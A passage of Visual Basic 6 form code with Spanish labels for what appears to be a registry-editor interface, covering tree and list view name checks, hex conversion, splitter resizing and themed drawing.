    'LoadPicture(App.Path & "\iconos\" & i & ".ico")

End Sub

Private Function NameExist(ByVal sName As String, ByVal bKey As Boolean) As Boolean

    Dim i As Long
    Dim hNode As Long
    
    If bKey Then
       
        hNode = ucTreeView1.SelectedNode
    
        For i = 1 To ucTreeView1.NodeChildren(hNode)
            hNode = ucTreeView1.NodeNext(hNode)
            If UCase(ucTreeView1.NodeText(hNode)) = UCase(sName) Then
                NameExist = True
                Exit Function
            End If
        Next
 
    Else

        For i = 0 To ucListView1.Count - 1
            If UCase(ucListView1.ItemText(i)) = UCase(sName) Then
                NameExist = True
                Exit Function
            End If
        Next

    End If
    
End Function

Private Function GetNewName(ByVal bKey As Boolean) As String
    Dim sName As String
    Dim i As Long
    Dim j As Long
    Dim bExist As Boolean
    Dim hNode As Long
    
    If bKey Then
        sName = "Clave nueva #"
        
        Do
            j = j + 1
            bExist = False
            hNode = ucTreeView1.SelectedNode

            For i = 1 To ucTreeView1.NodeChildren(hNode)
                hNode = ucTreeView1.NodeNext(hNode)
                If UCase(ucTreeView1.NodeText(hNode)) = UCase(sName & j) Then
                    bExist = True
                    Exit For
                End If
            Next
            If bExist = False Then Exit Do
        Loop
    Else
        sName = "Nuevo valor #"
        
        Do
            j = j + 1
            bExist = False
            For i = 0 To ucListView1.Count - 1
                If UCase(ucListView1.ItemText(i)) = UCase(sName & j) Then
                    bExist = True
                    Exit For
                End If
            Next
            If bExist = False Then Exit Do
        Loop
    End If
    GetNewName = sName & j
    
End Function



Public Function ExplainPath(ByVal oPath As String) As String
    ExplainPath = Replace(oPath, RemoteIP & "\", vbNullString)
End Function

Public Function BinaryToHex(ByVal vData As Variant, Optional MaxLen As Long = 0) As String
    Dim ArrSize As Long
    Dim sData As String
    Dim i As Long
    Dim j As Long
    Dim sHex As String
    Dim ArrBin() As Byte
    
    

    If VarType(vData) = vbString Then
        ArrBin = StrConv(vData, vbFromUnicode)
    Else
        ArrBin = vData
    End If
    
    ArrSize = UBound(ArrBin)
    If MaxLen > ArrSize Or MaxLen = 0 Then MaxLen = ArrSize
    
    sData = String(MaxLen * 3, "0")

    For i = 1 To (MaxLen * 3) Step 3
        sHex = Hex(ArrBin(j))
        Mid(sData, (i + 2) - Len(sHex)) = sHex & " "
        j = j + 1
    Next

    BinaryToHex = sData & IIf(ArrSize > MaxLen, "...", "")

End Function

Private Function BigHex(ByVal Value As Currency) As String
    BigHex = Hex(CurrencyToLong(Value))
End Function

Private Function LongToCurrency(ByVal lVal As Long) As Currency
    If lVal < 0 Then
        LongToCurrency = 4294967296# + lVal
    Else
        LongToCurrency = lVal
    End If
End Function

Private Function CurrencyToLong(ByVal val As Currency) As Long
    If val > 2147483647# Then
        CurrencyToLong = val - 4294967296#
    Else
        CurrencyToLong = val
    End If
End Function


Private Sub ucStatusbar1_Resize()
    ucProgressBar1.Move (ucStatusbar1.PanelWidth(1) * Screen.TwipsPerPixelX) + 20, ucStatusbar1.Top + 30, _
                        (ucStatusbar1.PanelWidth(2) * Screen.TwipsPerPixelX) - 60, ucStatusbar1.Height - 40
    
    ucProgressBar1.ZOrder 0
End Sub

Private Sub Form_Resize()
    On Error Resume Next
    Dim FrameHeight As Long
    
    
    If PicSearch.Visible Then
        If PicSpliterHorizontal.Top > Me.ScaleHeight - 2000 And Me.ScaleHeight > 4000 Then PicSpliterHorizontal.Top = Me.ScaleHeight - 2000
        PicSpliterHorizontal.Width = Me.ScaleWidth
        PicSearch.Move 0, PicSpliterHorizontal.Top + PicSpliterHorizontal.ScaleHeight, Me.ScaleWidth, Me.ScaleHeight - ucStatusbar1.Height - PicSpliterHorizontal.Top - PicSpliterHorizontal.ScaleHeight
        PicSearch.Cls
        DrawTheme PicSearch.hdc, "window", 2, 1, 0, 0, PicSearch.ScaleWidth / Screen.TwipsPerPixelX, 21
        DrawTheme PicSearch.hdc, "window", 19, 1, (PicSearch.ScaleWidth / Screen.TwipsPerPixelX) - 18, 4, 13, 13
        FrameHeight = PicSearch.Height + PicSpliterHorizontal.Height
    End If
    
    ucLvSearch.Width = Me.ScaleWidth - ucLvSearch.Left
    ucLvSearch.Height = PicSearch.ScaleHeight - ucLvSearch.Top - 100
    PicSpliter.Height = Me.ScaleHeight - ucStatusbar1.Height - FrameHeight
    ucTreeView1.Move 0, 0, PicSpliter.Left, Me.ScaleHeight - ucStatusbar1.Height - FrameHeight
    ucListView1.Move ucTreeView1.Width + PicSpliter.Width, 0, Me.ScaleWidth - ucTreeView1.Width - PicSpliter.Width, Me.ScaleHeight - ucStatusbar1.Height - FrameHeight
End Sub

Private Sub PicSpliter_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    On Error Resume Next
    Static LastX As Single
    Dim lPos As Long
    
    If Button = 1 Then
        lPos = PicSpliter.Left + (X - LastX)
        If lPos > 1000 And lPos < Me.ScaleWidth - 1000 Then
            PicSpliter.Left = lPos
            Form_Resize
        End If
    Else
        LastX = X
    End If

End Sub

Private Sub PicSpliterHorizontal_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    On Error Resume Next
    Static LastY As Single
    Dim lPos As Long
    
    If Button = 1 Then
        lPos = PicSpliterHorizontal.Top + (Y - LastY)
        If lPos > 2000 And lPos < Me.ScaleHeight - 2000 Then
            PicSpliterHorizontal.Top = lPos
            Form_Resize
        End If
    Else
        LastY = Y
    End If
End Sub

Private Function DrawTheme(ByVal hdc As Long, ByVal ClasList As String, ByVal PartId As Long, ByVal StateId As Long, _
                           ByVal Left As Long, ByVal Top As Long, ByVal Width As Long, ByVal Height As Long) As Boolean


    Dim hTheme  As Long
    Dim Rec As RECT
    
    hTheme = OpenThemeData(0&, StrPtr(ClasList))

    If (hTheme) Then
        With Rec
            .Left = Left
            .Top = Top
            .Right = Left + Width
            .Bottom = Top + Height
        End With
        
        DrawTheme = DrawThemeBackGround(hTheme, hdc, PartId, StateId, Rec, ByVal 0&) = 0
        
        Call CloseThemeData(hTheme)
    End If
    
End Function

